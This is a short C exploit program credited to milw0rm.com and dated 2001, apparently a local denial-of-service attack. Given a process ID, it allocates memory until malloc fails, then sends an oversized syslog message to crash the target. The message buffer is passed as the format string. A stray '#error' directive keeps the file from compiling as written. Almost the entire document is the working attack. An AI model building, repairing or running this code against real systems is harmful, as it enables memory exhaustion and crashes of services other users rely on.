#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <syslog.h>

#error

int main(int argc, char **argv)
{
   	char foo[1000];
        char bigmsg[10000];
	char *s, *hold_s; 
	int i = 0;
        
        memset(bigmsg, 'X', sizeof(bigmsg)-1);
   	if (argc < 2) {
           	printf("usage: %s <pid to kill>\n", argv[0]);
                exit(1);
        }
//	fork();
        memset(foo, 0, sizeof(foo));
        snprintf(foo, sizeof(foo), "/proc/%s/stat", argv[1]);
   	while (access(foo, F_OK) == 0) {
           	s = malloc(10000);
		if (s == NULL) {
			if (hold_s)
				free(hold_s);
/*			if (s)
				s[i%10000] = 0;
*/			printf("crashing ... \n");
			openlog("b00m", 0, 0);
        		syslog(1, bigmsg);
			closelog();
		}
                printf("%d\r", i++); fflush(stdout);
		hold_s = s;
        }
        return 0;
}


// milw0rm.com [2001-01-03]
